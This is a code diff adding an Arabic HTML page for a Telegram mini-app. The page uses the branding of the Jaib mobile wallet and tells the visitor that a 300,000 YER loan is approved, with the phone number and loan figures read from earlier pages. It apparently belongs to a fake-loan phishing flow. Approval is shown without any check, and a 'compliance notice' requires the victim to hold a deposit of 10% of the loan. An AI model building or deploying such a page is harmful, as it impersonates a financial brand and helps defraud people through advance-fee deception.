@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تمت الموافقة - جيب (Jaib)</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <!-- ✅ Arabic Font (Tajawal) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --jaib-red: #D9142B;          /* Jaib Signature Crimson Red */
+            --jaib-red-dark: #B00E21;
+            --jaib-gradient: linear-gradient(180deg, #F0243C 0%, #D9142B 100%);
+            --jaib-dark: #18181B;
+            --bg-color: #FFFFFF;
+            --text-dark: #18181B;
+            --text-muted: #666666;
+            --warning-bg: #FFF5F6;
+            --warning-border: #D9142B;
+            --warning-title: #C81026;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--jaib-red);
+            margin: 0;
+            padding: 20px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+        }
+
+        .screen-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--bg-color);
+            border-radius: 28px;
+            padding: 30px 20px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.22);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Checkmark Circle Icon */
+        .check-circle {
+            width: 80px;
+            height: 80px;
+            background: var(--jaib-gradient);
+            color: #FFFFFF;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 18px rgba(217, 20, 43, 0.35);
+        }
+
+        /* Title Header */
+        .congrats-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--jaib-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .sub-text {
+            color: var(--text-muted);
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.55;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        /* Approved Amount Jaib Card */
+        .amount-box {
+            width: 100%;
+            background: var(--jaib-gradient);
+            border-radius: 16px;
+            padding: 22px 15px;
+            text-align: center;
+            color: #FFFFFF;
+            margin-bottom: 25px;
+            box-shadow: 0 6px 18px rgba(217, 20, 43, 0.3);
+        }
+
+        .amount-label {
+            font-size: 13px;
+            font-weight: 800;
+            letter-spacing: 0.4px;
+            opacity: 0.95;
+            margin-bottom: 8px;
+        }
+
+        .amount-value {
+            font-size: 30px;
+            font-weight: 900;
+            letter-spacing: 0.3px;
+        }
+
+        /* Notice Card */
+        .info-card {
+            width: 100%;
+            background-color: var(--warning-bg);
+            border-right: 4px solid var(--warning-border);
+            border-top: 1px solid #FAD1D6;
+            border-left: 1px solid #FAD1D6;
+            border-bottom: 1px solid #FAD1D6;
+            border-radius: 14px;
+            padding: 18px 16px;
+            margin-bottom: 25px;
+        }
+
+        .info-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 10px;
+            color: var(--warning-title);
+            font-weight: 900;
+            font-size: 14px;
+        }
+
+        .info-body {
+            font-size: 13.5px;
+            line-height: 1.6;
+            color: #4A4A4A;
+        }
+
+        /* Detail List */
+        .details-list {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .details-heading {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 17px;
+            font-weight: 900;
+            color: var(--text-dark);
+        }
+
+        .detail-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 16px;
+        }
+
+        .icon-bg {
+            width: 44px;
+            height: 44px;
+            background-color: var(--warning-bg);
+            border: 1px solid #FAD1D6;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .detail-label {
+            font-size: 12px;
+            color: var(--text-muted);
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .detail-val {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        /* Quick Actions */
+        .action-title {
+            width: 100%;
+            font-weight: 800;
+            margin: 15px 0 12px;
+            color: var(--jaib-dark);
+            font-size: 15px;
+        }
+
+        .btn-list {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-white {
+            background: #FFFFFF;
+            border: 1px solid #E5E7EB;
+            padding: 14px 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            color: var(--text-dark);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+
+        .btn-white:hover {
+            background-color: var(--warning-bg);
+            border-color: #FAD1D6;
+        }
+
+        .next-steps {
+            width: 100%;
+            background-color: #F8F9FA;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #EDF2F7;
+        }
+
+        .home-btn {
+            background-color: var(--jaib-red);
+            color: #FFFFFF;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(217, 20, 43, 0.35);
+            transition: background-color 0.2s;
+        }
+
+        .home-btn:hover {
+            background-color: var(--jaib-red-dark);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="screen-container">
+        
+        <!-- Header Checkmark -->
+        <div class="check-circle">✓</div>
+        
+        <div class="congrats-title">
+            <span>🎉</span> تهانينا!
+        </div>
+
+        <div class="sub-text">
+            تمت <b>الموافقة</b> على قرضك عبر محفظة جيب (Jaib)! وسيتم صرف المبلغ قريباً.
+        </div>
+
+        <!-- Approved Amount Jaib Card -->
+        <div class="amount-box">
+            <div class="amount-label">المبلغ المعتمد</div>
+            <div class="amount-value" id="display-amount">300,000 YER</div>
+        </div>
+
+        <!-- Compliance Notice -->
+        <div class="info-card">
+            <div class="info-header">⚠️ تنويه الامتثال والشروط</div>
+            <div class="info-body">
+                يجب أن يظل حساب محفظة جيب (Jaib) الخاص بك نشطاً مع الاحتفاظ برصيد ضمان لا يقل عن <b>10% من مبلغ القرض المطلوب</b>. هذا الرصيد مسترد بالكامل عند سداد القرض بنجاح ويتيح لك حدوداً أعلى مستقبلاً.
+            </div>
+        </div>
+
+        <!-- Details Section -->
+        <div class="details-list">
+            <div class="details-heading">
+                <span>💳</span> تفاصيل القرض
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">🇾🇪</div>
+                <div>
+                    <div class="detail-label">رقم الهاتف</div>
+                    <div class="detail-val" id="display-phone" dir="ltr">+967 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">القسط الشهري</div>
+                    <div class="detail-val" id="display-monthly">27,000 YER</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">مدة السداد</div>
+                    <div class="detail-val" id="display-term">12 شهر</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📈</div>
+                <div>
+                    <div class="detail-label">نسبة المرابحة السنوية</div>
+                    <div class="detail-val">5% سنوياً</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="action-title">إجراءات سريعة</div>
+        <div class="btn-list">
+            <div class="btn-white">💰 إيداع</div>
+            <div class="btn-white">💸 سحب</div>
+            <div class="btn-white">📄 كشف الحساب</div>
+        </div>
+
+        <!-- Next Steps -->
+        <div class="next-steps">
+            <div style="font-weight: 800; color: var(--jaib-dark); margin-bottom: 6px; font-size: 14px;">📱 الخطوات التالية:</div>
+            <div style="font-size: 13px; color: var(--text-muted); line-height: 1.55;">
+                ستصلك رسالة تأكيد عبر محفظة جيب (Jaib) تتضمن تفاصيل صرف المبلغ خلال 24 ساعة.
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/page1'">🏠 العودة إلى الرئيسية</button>
+
+    </div>
+
+    <script>
+        function formatDurationArabic(months) {
+            const num = Number(String(months).replace(/\D/g, '')) || 12;
+            return (num >= 3 && num <= 10) ? `${num} أشهر` : `${num} شهر`;
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            // Retrieve stored data from earlier pages
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "771234567";
+            const loanAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || "300000";
+            const loanTerm = localStorage.getItem('loan_term') || localStorage.getItem('duration') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || localStorage.getItem('monthly') || "27000";
+
+            // Format values with YER currency
+            const numAmount = Number(loanAmount.toString().replace(/\D/g, '')) || 300000;
+            const numMonthly = Number(monthlyPay.toString().replace(/\D/g, '')) || 27000;
+
+            const formattedAmount = numAmount.toLocaleString('en-US') + " YER";
+            const formattedMonthly = numMonthly.toLocaleString('en-US') + " YER";
+
+            // Clean & format Yemen phone (+967)
+            let rawPhone = savedPhone.replace(/\D/g, '');
+            if (rawPhone.startsWith('967')) {
+                rawPhone = rawPhone.slice(3);
+            }
+            const formattedPhone = rawPhone ? `+967 ${rawPhone}` : "+967 ...";
+
+            // Bind values to the UI
+            document.getElementById('display-amount').innerText = formattedAmount;
+            document.getElementById('display-phone').innerText = formattedPhone;
+            document.getElementById('display-term').innerText = formatDurationArabic(loanTerm);
+            document.getElementById('display-monthly').innerText = formattedMonthly;
+        });
+    </script>
+</body>
+</html>
